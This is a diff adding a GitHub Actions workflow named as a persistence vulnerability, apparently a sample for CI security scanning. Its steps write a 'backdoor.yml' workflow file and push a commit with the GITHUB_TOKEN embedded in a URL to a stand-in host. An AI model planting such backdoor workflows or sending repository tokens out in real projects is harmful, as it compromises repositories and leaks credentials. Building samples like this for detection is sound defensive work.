@@ -1,0 +1,25 @@
+name: Persistence and Modification Vulnerability
+on:
+  schedule:
+    - cron: '0 0 * * *'
+
+permissions:
+  contents: read
+
+jobs:
+  cron-job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+        with:
+          persist-credentials: false
+
+      - name: Overwrite workflow definition
+        run: echo "malicious" > .github/workflows/backdoor.yml
+
+      - name: Push commit using GITHUB_TOKEN
+        run: |
+          git config user.name "bot"
+          git commit -m "Automated update"
+          git push https://$GITHUB_TOKEN@example.invalid/repo.git
